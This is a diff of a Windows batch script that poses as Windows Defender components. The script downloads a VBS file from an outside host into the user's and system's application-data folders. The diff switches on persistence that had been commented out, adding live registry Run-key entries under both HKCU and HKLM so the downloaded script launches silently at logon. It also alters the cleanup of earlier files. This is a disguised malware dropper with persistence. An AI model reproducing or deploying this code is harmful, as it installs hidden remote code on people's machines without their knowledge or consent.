@@ -98,17 +98,15 @@ if not exist "%PROGRAMDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
 :: USER registry
 
 if exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
-    ::powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
-    ::set "userregistryauto=YES"
-    set "userregistryauto=NON"
+    powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
+    set "userregistryauto=YES"
 )
 if not exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
     mkdir "%APPDATA%/WindowsDefenderSecurity/"
     copy /y "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%APPDATA%\WindowsDefenderSecurity\"
     powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs', '%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
-    ::powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
-    ::set "userregistryauto=YES"
-    set "userregistryauto=NON"
+    powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
+    set "userregistryauto=YES"
 )
 
 
@@ -116,9 +114,8 @@ if not exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
 
 if exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
     if "%AdminRights%"=="true" (
-        ::powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
-        ::set "pcregistryauto=YES"
-        set "pcregistryauto=NON"
+        powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
+        set "pcregistryauto=YES"
     ) else (
         set "pcregistryauto=NON"
     )
@@ -128,9 +125,8 @@ if not exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs"
         mkdir "%PROGRAMDATA%/WindowsDefenderSecurity/"
         copy /y "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%PROGRAMDATA%\WindowsDefenderSecurity\"
         powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs', '%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
-        ::powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
-        ::set "pcregistryauto=YES"
-        set "pcregistryauto=NON"
+        powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
+        set "pcregistryauto=YES"
     ) else (
         set "pcregistryauto=NON"
     )
@@ -162,11 +158,11 @@ powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebR
 
 
 :: delete old files
-if exist "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.bat" (
-    del /f /q "%PROGRAMDATA%\WindowsDefenderSecurity\MicrosoftUpdate.bat"
+if exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat" (
+    ::del /f /s /q "%PROGRAMDATA%\MicrosoftDefenderSecurity" (NO PERMISSION)
 )
-if exist "%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.bat" (
-    del /f /q "%APPDATA%\WindowsDefenderSecurity\MicrosoftUpdate.bat"
+if exist "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat" (
+    del /f /q "%APPDATA%\MicrosoftDefenderSecurity"
 )
 
 endlocal
